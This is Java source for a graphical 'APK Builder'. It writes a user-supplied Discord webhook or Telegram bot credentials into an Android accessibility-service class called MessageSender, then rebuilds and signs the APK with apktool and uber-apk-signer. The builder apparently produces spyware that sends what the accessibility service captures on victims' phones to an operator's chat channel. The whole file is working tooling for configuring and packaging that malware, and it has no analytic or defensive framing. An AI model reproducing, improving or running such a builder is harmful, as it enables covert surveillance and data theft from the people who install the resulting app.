import javax.swing.*;
import javax.swing.border.*;
import javax.swing.text.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class buildApk {
    private static final Color PRIMARY_COLOR = new Color(41, 172, 0);  // Indigo
    private static final Color ACCENT_COLOR = new Color(100, 205, 71);  // Medium Purple
    private static final Color BACKGROUND_COLOR = new Color(240, 242, 245);  // Light gray-blue
    private static final Color SUCCESS_COLOR = new Color(46, 125, 50);  // Dark green
    private static final Color ERROR_COLOR = new Color(198, 40, 40);  // Dark red
    private static final Color INFO_COLOR = new Color(2, 119, 189);  // Dark blue
    private static final Font MAIN_FONT = new Font("Segoe UI", Font.PLAIN, 14);
    private static final Font BUTTON_FONT = new Font("Segoe UI", Font.BOLD, 14);
	static boolean isDiscord = false;
	static boolean isTelegram = false;
	
    private static Image backgroundImage;
    private static JTextPane logArea;
    private static StyledDocument logDocument;
    private static SimpleDateFormat timeFormat = new SimpleDateFormat("HH:mm:ss");
    
    // New fields for Telegram input panels
    private static JPanel discordInputPanel;
    private static JPanel telegramInputPanel;
    private static JTextField discordWebhookField;
    private static JTextField botNumberField;
    private static JTextField secretKeyField;
    private static JTextField chatIdField;

    public static void main(String[] args) {
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception e) {
            e.printStackTrace();
        }

        SwingUtilities.invokeLater(() -> createAndShowGUI());
    }
	
    private static void createAndShowGUI() {
		backgroundImage = new ImageIcon("./Resources/backgroundimg.png").getImage();
        JFrame frame = new JFrame("APK Builder");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(600, 700); // Increased height for additional fields
        frame.setLocationRelativeTo(null);
		

        JPanel mainPanel = new JPanel() {
			@Override
			protected void paintComponent(Graphics g) {
				super.paintComponent(g);
				if (backgroundImage != null) {
					g.drawImage(backgroundImage, 0, 0, getWidth(), getHeight(), this);
				}
			}
		};
		mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
		mainPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
		mainPanel.setBackground(BACKGROUND_COLOR);

        // Title panel
        JPanel titlePanel = new JPanel();
        titlePanel.setLayout(new FlowLayout(FlowLayout.CENTER));
        titlePanel.setBackground(BACKGROUND_COLOR);
		titlePanel.setOpaque(false);
        JLabel titleLabel = new JLabel("Messaging Platform Selection");
        titleLabel.setFont(new Font("Segoe UI", Font.BOLD, 24));
        titleLabel.setForeground(PRIMARY_COLOR);
        titlePanel.add(titleLabel);
		titlePanel.setOpaque(false);

        // Radio buttons panel
        JPanel radioPanel = new JPanel();
        radioPanel.setLayout(new FlowLayout(FlowLayout.CENTER, 20, 10));
        radioPanel.setBackground(BACKGROUND_COLOR);
        radioPanel.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createEmptyBorder(10, 0, 10, 0),
            BorderFactory.createLineBorder(ACCENT_COLOR, 1, true)
        ));

        JRadioButton discordRadioButton = createStyledRadioButton("Discord");
        JRadioButton telegramRadioButton = createStyledRadioButton("Telegram");

        ButtonGroup group = new ButtonGroup();
        group.add(discordRadioButton);
        group.add(telegramRadioButton);

        radioPanel.add(discordRadioButton);
        radioPanel.add(telegramRadioButton);

        // Create Discord input panel
        discordInputPanel = new JPanel();
        discordInputPanel.setLayout(new BorderLayout(10, 10));
        discordInputPanel.setBackground(BACKGROUND_COLOR);
        discordInputPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 10, 0));
		discordInputPanel.setOpaque(false);

        JLabel webhookLabel = new JLabel("Webhook URL:");
        webhookLabel.setFont(MAIN_FONT);
        webhookLabel.setForeground(PRIMARY_COLOR);

        discordWebhookField = createStyledTextField("Ex: https://discord.com/api/webhooks/123456789/abcdef...");

        discordInputPanel.add(webhookLabel, BorderLayout.NORTH);
        discordInputPanel.add(discordWebhookField, BorderLayout.CENTER);

        // Create Telegram input panel
        telegramInputPanel = new JPanel();
        telegramInputPanel.setLayout(new GridLayout(3, 1, 10, 10));
        telegramInputPanel.setBackground(BACKGROUND_COLOR);
        telegramInputPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 10, 0));
		

        // Bot Number field
        JPanel botNumberPanel = new JPanel(new BorderLayout(5, 5));
        botNumberPanel.setBackground(BACKGROUND_COLOR);
        JLabel botNumberLabel = new JLabel("Bot Number:");
        botNumberLabel.setFont(MAIN_FONT);
        botNumberLabel.setForeground(PRIMARY_COLOR);
        botNumberField = createStyledTextField("EX: 6513289452");
        botNumberPanel.add(botNumberLabel, BorderLayout.NORTH);
        botNumberPanel.add(botNumberField, BorderLayout.CENTER);

        // Secret Key field
        JPanel secretKeyPanel = new JPanel(new BorderLayout(5, 5));
        secretKeyPanel.setBackground(BACKGROUND_COLOR);
        JLabel secretKeyLabel = new JLabel("Secret Key:");
        secretKeyLabel.setFont(MAIN_FONT);
        secretKeyLabel.setForeground(PRIMARY_COLOR);
        secretKeyField = createStyledTextField("EX: WmTHvwNsI7P0WpMjBuYzFdD9ec97C0C1a72");
        secretKeyPanel.add(secretKeyLabel, BorderLayout.NORTH);
        secretKeyPanel.add(secretKeyField, BorderLayout.CENTER);

        // Chat ID field
        JPanel chatIdPanel = new JPanel(new BorderLayout(5, 5));
        chatIdPanel.setBackground(BACKGROUND_COLOR);
        JLabel chatIdLabel = new JLabel("Chat ID:");
        chatIdLabel.setFont(MAIN_FONT);
        chatIdLabel.setForeground(PRIMARY_COLOR);
        chatIdField = createStyledTextField("EX: 6549852654");
        chatIdPanel.add(chatIdLabel, BorderLayout.NORTH);
        chatIdPanel.add(chatIdField, BorderLayout.CENTER);

        telegramInputPanel.add(botNumberPanel);
        telegramInputPanel.add(secretKeyPanel);
        telegramInputPanel.add(chatIdPanel);

        // Initially hide Telegram panel
        telegramInputPanel.setVisible(false);
		telegramInputPanel.setOpaque(false);

        // Radio button listeners
        discordRadioButton.addActionListener(e -> {
            discordInputPanel.setVisible(true);
            telegramInputPanel.setVisible(false);
        });

        telegramRadioButton.addActionListener(e -> {
            discordInputPanel.setVisible(false);
            telegramInputPanel.setVisible(true);
        });

        // Buttons panel
        JPanel buttonPanel = new JPanel();
        buttonPanel.setLayout(new FlowLayout(FlowLayout.CENTER, 20, 10));
        buttonPanel.setBackground(BACKGROUND_COLOR);
		buttonPanel.setOpaque(false);

        JButton buildButton = createStyledButton("BUILD APK");
        JButton signButton = createStyledButton("SIGN APK");
        
        buttonPanel.add(buildButton);
        buttonPanel.add(signButton);

        // Log panel
        JPanel logPanel = createLogPanel();

        // Add all panels to main panel
        mainPanel.add(titlePanel);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));
        mainPanel.add(radioPanel);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));
        mainPanel.add(discordInputPanel);
        mainPanel.add(telegramInputPanel);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));
        mainPanel.add(buttonPanel);
        mainPanel.add(Box.createRigidArea(new Dimension(0, 20)));
        mainPanel.add(logPanel);

        // Button listeners
        buildButton.addActionListener(e -> {
			String selectedOption = discordRadioButton.isSelected() ? "Discord" : 
									telegramRadioButton.isSelected() ? "Telegram" : "None";

			// Directory logic
			String directoryPath;
			if (selectedOption.equals("Discord")) {
				directoryPath = "discord_version";
				isDiscord = true;
				isTelegram = false;

				// Validate Discord webhook
				if (discordWebhookField.getText().trim().isEmpty()) {
					logError("Please enter a Discord webhook URL");
					return;
				}
			} else if (selectedOption.equals("Telegram")) {
				directoryPath = "telegram_version";
				isDiscord = false;
				isTelegram = true;

				// Validate Telegram fields
				if (botNumberField.getText().trim().isEmpty() ||
					secretKeyField.getText().trim().isEmpty() ||
					chatIdField.getText().trim().isEmpty()) {
					logError("Please fill in all Telegram fields");
					return;
				}
			} else {
				logError("Please select a messaging platform");
				return;
			}
			
			if (isDiscord){
				Path sourcePathDiscord = Paths.get("./discord_version/smali_classes4/com/MyAccessibilityService$MessageSender.smali");
				Path destinationPath = Paths.get("MyAccessibilityService$MessageSender.smali"); // This will copy to the current directory

				try {
					Files.copy(sourcePathDiscord, destinationPath, StandardCopyOption.REPLACE_EXISTING);
					System.out.println("File copied successfully!");
				} catch (IOException error) {
					System.err.println("An error occurred: " + error.getMessage());
				}
			}

			// Update configuration file
			Path smaliPath = Paths.get(directoryPath, "smali_classes4", "com", "MyAccessibilityService$MessageSender.smali");
			try {
				logInfo("Updating configuration...");
				String content = new String(Files.readAllBytes(smaliPath));

				if (selectedOption.equals("Discord")) {
					content = content.replace("YOUR_DISCORD_WEBHOOK", discordWebhookField.getText().trim());
				} else if (selectedOption.equals("Telegram")) {
					content = content.replace("BOT_NUMBER", botNumberField.getText().trim())
								   .replace("SECRET_KEY", secretKeyField.getText().trim())
								   .replace("CHAT_ID", chatIdField.getText().trim());
				}

				Files.write(smaliPath, content.getBytes());
				logSuccess("Configuration updated successfully");
			} catch (IOException ex) {
				logError("Error updating configuration: " + ex.getMessage());
				return;
			}

			// Build APK
			String apkToolPath = "./Resources/apktool.jar";
			String outputApk = "./Output/app.apk";
			String[] command = {
				"java", "-jar", apkToolPath, "b", directoryPath, "-o", outputApk, "--use-aapt2"
			};

			executeCommand(command, "Building APK...", "APK built successfully");
		});


        signButton.addActionListener(e -> {
            String signToolPath = "./Resources/uber-apk-signer-1.3.0.jar";
            String apkToSign = "./Output/app.apk";
            String[] signCommand = {"java", "-jar", signToolPath, "--apks", apkToSign};

            executeCommand(signCommand, "Signing APK...", "APK signed successfully");
        });

        // Initial log message
        logInfo("Application started. Ready to build APK.");

        // Select Discord by default
        discordRadioButton.setSelected(true);
        
        // Final frame setup
        frame.add(mainPanel);
        frame.setVisible(true);
    }

    // Rest of the methods remain the same (createLogPanel, appendToLog, logError, logSuccess, logInfo, etc.)
    private static JPanel createLogPanel() {
        JPanel logPanel = new JPanel(new BorderLayout());
        logPanel.setBackground(BACKGROUND_COLOR);
        logPanel.setBorder(BorderFactory.createTitledBorder(
            BorderFactory.createLineBorder(ACCENT_COLOR),
            "Log Output",
            TitledBorder.LEFT,
            TitledBorder.TOP,
            MAIN_FONT,
            PRIMARY_COLOR
        ));

        logArea = new JTextPane();
        logArea.setFont(new Font("Consolas", Font.PLAIN, 12));
        logArea.setEditable(false);
        logArea.setBackground(new Color(250, 250, 250));
        logDocument = logArea.getStyledDocument();

        Style defaultStyle = logArea.addStyle("default", null);
        StyleConstants.setFontFamily(defaultStyle, "Consolas");
        StyleConstants.setFontSize(defaultStyle, 12);

        JScrollPane scrollPane = new JScrollPane(logArea);
        scrollPane.setPreferredSize(new Dimension(0, 150));
        scrollPane.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));

        logPanel.add(scrollPane, BorderLayout.CENTER);
        return logPanel;
    }

    private static void appendToLog(String message, Color color) {
        SwingUtilities.invokeLater(() -> {
            try {
                Style style = logArea.addStyle("CurrentStyle", null);
                StyleConstants.setForeground(style, color);
                
                String timeStamp = timeFormat.format(new Date());
                String fullMessage = String.format("[%s] %s%n", timeStamp, message);
                
                logDocument.insertString(logDocument.getLength(), fullMessage, style);
                logArea.setCaretPosition(logDocument.getLength());
            } catch (BadLocationException e) {
                e.printStackTrace();
            }
        });
    }

    private static void logError(String message) {
        appendToLog("ERROR: " + message, ERROR_COLOR);
    }

    private static void logSuccess(String message) {
        appendToLog("SUCCESS: " + message, SUCCESS_COLOR);
    }

    private static void logInfo(String message) {
        appendToLog("INFO: " + message, INFO_COLOR);
    }

    private static JRadioButton createStyledRadioButton(String text) {
        JRadioButton radioButton = new JRadioButton(text);
        radioButton.setFont(MAIN_FONT);
        radioButton.setForeground(PRIMARY_COLOR);
        radioButton.setBackground(BACKGROUND_COLOR);
        return radioButton;
    }

    private static JTextField createStyledTextField(String placeholder) {
        JTextField textField = new JTextField(30) {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                
                if (getText().isEmpty() && !hasFocus()) {
                    Graphics2D g2d = (Graphics2D) g.create();
                    g2d.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
                    g2d.setColor(Color.GRAY);
                    g2d.setFont(getFont().deriveFont(Font.ITALIC));
                    g2d.drawString(placeholder, 
                        getInsets().left + 5, 
                        g2d.getFontMetrics().getMaxAscent() + getInsets().top + 2);
                    g2d.dispose();
                }
            }
        };
        
        textField.setFont(MAIN_FONT);
        textField.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createLineBorder(ACCENT_COLOR),
            BorderFactory.createEmptyBorder(5, 5, 5, 5)
        ));

        textField.addFocusListener(new FocusAdapter() {
			@Override
				public void focusGained(FocusEvent e) {
					textField.repaint();
				}

            @Override
            public void focusLost(FocusEvent e) {
                textField.repaint();
            }
        });

        return textField;
    }

    private static JButton createStyledButton(String text) {
        JButton button = new JButton(text);
        button.setFont(BUTTON_FONT);
        button.setForeground(new Color(17, 27, 33));
        button.setBackground(PRIMARY_COLOR);
        button.setFocusPainted(false);
        button.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));
        
        button.addMouseListener(new MouseAdapter() {
            public void mouseEntered(MouseEvent e) {
                button.setBackground(PRIMARY_COLOR);
                button.setCursor(new Cursor(Cursor.HAND_CURSOR));
            }
            public void mouseExited(MouseEvent e) {
                button.setBackground(PRIMARY_COLOR);
                button.setCursor(new Cursor(Cursor.DEFAULT_CURSOR));
            }
        });
        
        return button;
    }

    private static void executeCommand(String[] command, String startMessage, String successMessage) {
        logInfo(startMessage);
        
        SwingWorker<Void, String> worker = new SwingWorker<>() {
            @Override
            protected Void doInBackground() throws Exception {
                ProcessBuilder processBuilder = new ProcessBuilder(command);
                Process process = processBuilder.start();
                
                // Capture output in background
                StreamGobbler outputGobbler = new StreamGobbler(process.getInputStream(), "OUTPUT");
                StreamGobbler errorGobbler = new StreamGobbler(process.getErrorStream(), "ERROR");
                
                outputGobbler.start();
                errorGobbler.start();
                
                int exitCode = process.waitFor();
                if (exitCode == 0) {
                    publish(successMessage);
                } else {
                    publish("Process failed with exit code: " + exitCode);
                }
                
                return null;
            }

            @Override
            protected void process(java.util.List<String> chunks) {
                for (String message : chunks) {
                    if (message.startsWith("ERROR:")) {
                        logError(message.substring(6));
                    } else {
                        logInfo(message);
                    }
                }
            }

            @Override
            protected void done() {
                try {
                    get(); // Check for exceptions
                    logSuccess(successMessage);
					if (isDiscord) {
						Path sourcePath = Paths.get("MyAccessibilityService$MessageSender.smali");
        
						// Define the target directory
						Path targetDirectory = Paths.get("./discord_version/smali_classes4/com/");
						
						// Create the target path
						Path targetPath = targetDirectory.resolve(sourcePath.getFileName());
						
						try {
							// Ensure the target directory exists
							if (!Files.exists(targetDirectory)) {
								Files.createDirectories(targetDirectory);
							}

							// Move the file, replacing if it already exists
							Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);
							
							System.out.println("File moved successfully!");
						} catch (IOException e) {
							System.err.println("An error occurred: " + e.getMessage());
						}
					}
					else if (isTelegram) {
						Path sourcePath = Paths.get("MyAccessibilityService$MessageSender.smali");
        
						// Define the target directory
						Path targetDirectory = Paths.get("./telegram_version/smali_classes4/com/");
						
						// Create the target path
						Path targetPath = targetDirectory.resolve(sourcePath.getFileName());
						
						try {
							// Ensure the target directory exists
							if (!Files.exists(targetDirectory)) {
								Files.createDirectories(targetDirectory);
							}

							// Move the file, replacing if it already exists
							Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);
							
							System.out.println("File moved successfully!");
						} catch (IOException e) {
							System.err.println("An error occurred: " + e.getMessage());
						}
					}
                } catch (Exception e) {
                    logError("Error executing command: " + e.getMessage());
                }
            }
        };
        
        worker.execute();
    }

    private static class StreamGobbler extends Thread {
        private final InputStream is;
        private final String type;

        private StreamGobbler(InputStream is, String type) {
            this.is = is;
            this.type = type;
        }

        @Override
        public void run() {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(is))) {
                String line;
                while ((line = br.readLine()) != null) {
                    final String message = line;
                    SwingUtilities.invokeLater(() -> {
                        if (type.equals("ERROR")) {
                            logError(message);
                        } else {
                            logInfo(message);
                        }
                    });
                }
            } catch (IOException e) {
                SwingUtilities.invokeLater(() -> 
                    logError("Error reading " + type + " stream: " + e.getMessage())
                );
            }
        }
    }
}